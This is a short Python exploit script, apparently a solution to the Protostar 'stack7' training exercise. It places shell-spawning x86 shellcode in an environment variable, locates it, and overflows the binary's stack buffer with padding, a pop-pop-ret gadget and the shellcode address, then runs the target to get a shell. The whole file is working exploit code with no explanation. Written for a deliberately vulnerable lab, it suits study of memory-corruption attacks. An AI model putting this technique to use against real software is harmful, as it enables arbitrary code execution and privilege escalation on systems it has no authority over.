
import os
import subprocess
import struct


if not 'SHELLCODE' in os.environ:
	os.environ["SHELLCODE"]="\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

out=subprocess.Popen(["/home/user/getenv", "SHELLCODE", "/opt/protostar/stack7"], stdout=subprocess.PIPE).communicate()[0].split()
env_addr=out[len(out)-1]
int_addr=int(env_addr,16)

sploit = "A" * 80
sploit += struct.pack("I", 0x08048492) # pop ebx;pop ebp;ret
sploit += "\x90"*8 # padding
sploit += struct.pack("I", int_addr) # shellcode env var

with open("/tmp/stack7_sploit", "wb") as f:
	f.write(sploit)
os.system("/opt/protostar/bin/stack7 < /tmp/stack7_sploit")
os.remove("/tmp/stack7_sploit")
